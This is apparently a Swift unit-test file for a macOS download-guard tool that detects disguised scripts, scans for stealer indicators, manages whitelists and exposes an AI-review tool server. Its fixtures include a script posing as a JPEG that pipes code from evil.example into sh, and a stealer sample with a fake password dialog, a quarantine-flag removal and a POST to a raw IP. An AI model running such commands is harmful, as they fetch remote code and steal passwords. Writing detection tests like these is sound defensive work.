import XCTest
@testable import DownloadGuardCore

final class DownloadGuardCoreTests: XCTestCase {
    var dir: URL!

    override func setUpWithError() throws {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent("dg-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: dir)
    }

    func write(_ name: String, _ text: String) throws -> URL {
        let url = dir.appendingPathComponent(name)
        try Data(text.utf8).write(to: url)
        return url
    }

    func setWhereFroms(_ url: URL, _ list: [String]) throws {
        let data = try PropertyListSerialization.data(fromPropertyList: list, format: .binary, options: 0)
        _ = data.withUnsafeBytes {
            setxattr(url.path, "com.apple.metadata:kMDItemWhereFroms", $0.baseAddress, data.count, 0, 0)
        }
    }

    // MARK: - 分類與偽裝

    func testScriptDisguisedAsImageIsNotWhitelistedByExtension() throws {
        let url = try write("photo.jpg", "#!/bin/sh\ncurl -s http://evil.example/x | sh\n")
        let facts = FileInspector.inspect(url)
        XCTAssertEqual(facts.category, .script)
        XCTAssertTrue(facts.disguised)
        XCTAssertNil(Whitelist.default.match(facts), "副檔名白名單不能放行偽裝成圖片的腳本")
        let signals = LocalRules.signals(facts: facts, ioc: IOCScanner.scan(path: url.path, facts: facts))
        XCTAssertEqual(LocalRules.verdict(for: signals), .suspicious)
    }

    func testPlainTextDocument() throws {
        let url = try write("notes.md", "# hello\njust notes\n")
        let facts = FileInspector.inspect(url)
        XCTAssertEqual(facts.category, .document)
        XCTAssertFalse(facts.disguised)
        XCTAssertNotNil(facts.sha256)
        XCTAssertEqual(LocalRules.verdict(for: LocalRules.signals(facts: facts, ioc: nil)), .safe)
    }

    // MARK: - IOC

    func testIOCFindsStealerTechniques() {
        let sample = """
        osascript -e 'display dialog "System Preferences needs your password" default answer ""'
        dscl . -authonly user pw
        xattr -d com.apple.quarantine /tmp/x ; killall Terminal
        curl -X POST http://45.94.47.10/contact
        """
        let r = IOCScanner.scan(data: Data(sample.utf8))
        XCTAssertNotNil(r.hits["dscl . -authonly"])
        XCTAssertNotNil(r.hits["killall Terminal"])
        XCTAssertNotNil(r.hits["xattr -d com.apple.quarantine"])
        XCTAssertTrue(r.ips.contains("45.94.47.10"))
        XCTAssertTrue(r.urls.contains { $0.hasPrefix("http://45.94.47.10") })
        XCTAssertTrue(r.signals.contains { $0.severity == .critical })
    }

    func testIPFilterSkipsVersionsAndLocal() {
        XCTAssertFalse(IOCScanner.isInterestingIP("1.2.3.4"))
        XCTAssertFalse(IOCScanner.isInterestingIP("127.0.0.1"))
        XCTAssertFalse(IOCScanner.isInterestingIP("192.168.1.20"))
        XCTAssertTrue(IOCScanner.isInterestingIP("38.244.158.56"))
    }

    // MARK: - 白名單

    func testDomainWhitelistMatchesSubdomainsOfDownloadOrReferrer() throws {
        let url = try write("tool.zip", "PK")
        try setWhereFroms(url, ["https://dl.example.com/tool.zip", "https://www.vendor.org/download"])
        let facts = FileInspector.inspect(url)
        XCTAssertEqual(facts.downloadHost, "dl.example.com")
        XCTAssertNotNil(Whitelist(domains: ["example.com"]).match(facts))
        XCTAssertNotNil(Whitelist(domains: ["vendor.org"]).match(facts))
        XCTAssertNil(Whitelist(domains: ["ample.com"]).match(facts), "不能只比對字尾字串")
    }

    func testSHA256Whitelist() throws {
        let url = try write("a.bin", "hello")
        let facts = FileInspector.inspect(url)
        XCTAssertNotNil(Whitelist(sha256: [facts.sha256!.uppercased()]).match(facts))
    }

    func testSuggestionMustMatchRealFacts() throws {
        let url = try write("tool.zip", "PK")
        try setWhereFroms(url, ["https://dl.example.com/tool.zip"])
        let facts = FileInspector.inspect(url)
        XCTAssertTrue(Whitelist.isConsistent(.init(kind: .domain, value: "example.com"), with: facts))
        XCTAssertTrue(Whitelist.isConsistent(.init(kind: .domain, value: "https://dl.example.com/x"), with: facts))
        XCTAssertFalse(Whitelist.isConsistent(.init(kind: .domain, value: "attacker.net"), with: facts))
        XCTAssertFalse(Whitelist.isConsistent(.init(kind: .domain, value: "com"), with: facts))
        XCTAssertFalse(Whitelist.isConsistent(.init(kind: .teamID, value: "ABCDE12345"), with: facts),
                       "沒有簽章的檔案不能建議信任開發者")
        XCTAssertTrue(Whitelist.isConsistent(.init(kind: .sha256, value: facts.sha256!), with: facts))
    }

    func testWhitelistToolsAddAndRemove() throws {
        let file = dir.appendingPathComponent("whitelist.json")
        let tools = WhitelistTools(file: file)
        _ = try tools.call("whitelist_add", ["kind": "domain", "value": "https://GitHub.com/foo"])
        _ = try tools.call("whitelist_add", ["kind": "extension", "value": ".PDF"])
        var list = Whitelist.load(from: file)
        XCTAssertTrue(list.domains.contains("github.com"))
        XCTAssertTrue(list.extensions.contains("pdf"))
        _ = try tools.call("whitelist_remove", ["kind": "domain", "value": "github.com"])
        list = Whitelist.load(from: file)
        XCTAssertFalse(list.domains.contains("github.com"))
    }

    // MARK: - MCP

    func testMCPProtocolAndVerdict() throws {
        let target = try write("setup.command", "#!/bin/sh\necho hi\n")
        let out = dir.appendingPathComponent("verdict.json")
        let server = MCPServer(tools: ScanTools(target: target, verdictOut: out))

        let initReply = server.handle(["jsonrpc": "2.0", "id": 1, "method": "initialize",
                                       "params": ["protocolVersion": "2025-06-18"]])
        let initResult = initReply?["result"] as? [String: Any]
        XCTAssertEqual(initResult?["protocolVersion"] as? String, "2025-06-18")
        XCTAssertNil(server.handle(["jsonrpc": "2.0", "method": "notifications/initialized"]))

        let list = server.handle(["jsonrpc": "2.0", "id": 2, "method": "tools/list"])
        let names = ((list?["result"] as? [String: Any])?["tools"] as? [[String: Any]])?.compactMap { $0["name"] as? String }
        XCTAssertEqual(Set(names ?? []), ["inspect_file", "scan_strings", "read_text", "submit_verdict"])

        let read = server.handle(["jsonrpc": "2.0", "id": 3, "method": "tools/call",
                                  "params": ["name": "read_text", "arguments": [String: Any]()]])
        let text = (((read?["result"] as? [String: Any])?["content"] as? [[String: Any]])?.first?["text"] as? String) ?? ""
        XCTAssertTrue(text.contains("<untrusted_file_data>"))
        XCTAssertTrue(text.contains("echo hi"))

        _ = server.handle(["jsonrpc": "2.0", "id": 4, "method": "tools/call",
                           "params": ["name": "submit_verdict",
                                      "arguments": ["verdict": "suspicious", "summary": "測試", "reasons": ["a"]]]])
        let saved = try JSONDecoder().decode(ClaudeVerdict.self, from: Data(contentsOf: out))
        XCTAssertEqual(saved.verdict, .suspicious)

        let unknown = server.handle(["jsonrpc": "2.0", "id": 5, "method": "nope"])
        XCTAssertNotNil(unknown?["error"])
    }

    func testReadTextCannotEscapeTargetFolder() throws {
        let folder = dir.appendingPathComponent("App Folder", isDirectory: true)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        try Data("inside".utf8).write(to: folder.appendingPathComponent("a.txt"))
        _ = try write("secret.txt", "outside")
        let tools = ScanTools(target: folder, verdictOut: dir.appendingPathComponent("v.json"))
        XCTAssertTrue(try tools.call("read_text", ["member": "a.txt"]).contains("inside"))
        XCTAssertThrowsError(try tools.call("read_text", ["member": "../secret.txt"]))
    }

    // MARK: - 小黑屋

    func testReleaseMarksFileAndAvoidsNameClash() throws {
        let holding = dir.appendingPathComponent("hold", isDirectory: true)
        let downloads = dir.appendingPathComponent("dl", isDirectory: true)
        try FileManager.default.createDirectory(at: downloads, withIntermediateDirectories: true)
        try Data("old".utf8).write(to: downloads.appendingPathComponent("a.pdf"))

        let src = try write("a.pdf", "new")
        let held = try HoldingPen.admit(src, holding: holding)
        XCTAssertFalse(HoldingPen.isReleased(held))
        let released = try HoldingPen.release(held, to: downloads)
        XCTAssertEqual(released.lastPathComponent, "a 2.pdf")
        XCTAssertTrue(HoldingPen.isReleased(released))
    }

    // MARK: - 監看

    func testWatcherIgnoresTemporaryDownloadsAndReportsFinishedFile() throws {
        XCTAssertTrue(DownloadWatcher.shouldIgnore("movie.mp4.crdownload"))
        XCTAssertTrue(DownloadWatcher.shouldIgnore(".DS_Store"))
        XCTAssertFalse(DownloadWatcher.shouldIgnore("movie.mp4"))

        let ready = expectation(description: "finished file reported")
        var reported: [String] = []
        let watcher = DownloadWatcher(directory: dir) { url in
            reported.append(url.lastPathComponent)
            if url.lastPathComponent == "movie.mp4" { ready.fulfill() }
        }
        watcher.settleDelay = 0.5
        watcher.start()
        defer { watcher.stop() }

        // 模擬瀏覽器:先寫暫存檔,完成後改名
        let temp = try write("movie.mp4.crdownload", "partial")
        Thread.sleep(forTimeInterval: 0.3)
        try FileManager.default.moveItem(at: temp, to: dir.appendingPathComponent("movie.mp4"))
        wait(for: [ready], timeout: 10)
        XCTAssertEqual(reported, ["movie.mp4"])
    }
}
